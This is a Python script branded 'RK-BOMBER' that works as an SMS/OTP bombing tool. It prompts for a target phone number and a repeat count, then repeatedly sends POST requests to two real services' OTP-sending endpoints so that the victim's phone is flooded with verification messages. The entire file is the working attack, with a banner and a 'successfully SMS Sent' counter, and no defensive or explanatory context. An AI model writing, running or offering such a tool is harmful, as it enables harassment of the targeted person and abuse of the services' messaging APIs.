import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system

os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

on_green="\033[42m"       # Green

logo=(red+"""  _____  _  __     ____   ____  __  __ ____  ______ _____  
 |  __ \| |/ /    |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 | |__) | ' /_____| |_) | |  | | \  / | |_) | |__  | |__) |
 |  _  /|  <______|  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | | \ \| . \     | |_) | |__| | |  | | |_) | |____| | \ \ 
 |_|  \_\_|\_\    |____/ \____/|_|  |_|____/|______|_|  \_\  """)
                                                  



line=(yellow+"======================================================================")
tversion=(cyan+"\t\t   Version : 0.1 ")

line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
 
dtls=(yellow+"\t\t Created By: RK-RaiHaN-KhaN ")

note=(cyan+"Note: This is My Personal Tools.")

print(logo)

print(" ")

print(dtls)

print(tversion)

print(line)

print(note)

print(line)





print(' ')

number=str(input(red+"[➙] Enter Terget Number : "))
amount=int(input(green+"[➙] Enter The Amount : "))



url1 = "https://api.maya-apa.com/api/v5/app/send_otp"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone=88"+number+"&device_id=fbcd0de286304cba&source=app&lat=23.1634554&long=89.577101"


url2 = "https://toffeelive.com/app/service.php"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "phoneNumber="+number+"&route=auth_verify_mobile_no"




for i in range (amount):
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp2 = requests.post(url2, headers=headers2, data=data2)


	print(str(i+1)+yellow+'.	➙ successfully SMS Sent ✅')
	
	
print('					')
print(red+"""
\t\t\t (THANK YOU)

_____  _  __     ____   ____  __  __ ____  ______ _____  
 |  __ \| |/ /    |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 | |__) | ' /_____| |_) | |  | | \  / | |_) | |__  | |__) |
 |  _  /|  <______|  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | | \ \| . \     | |_) | |__| | |  | | |_) | |____| | \ \ 
 |_|  \_\_|\_\    |____/ \____/|_|  |_|____/|______|_|  \_\ 
  """)
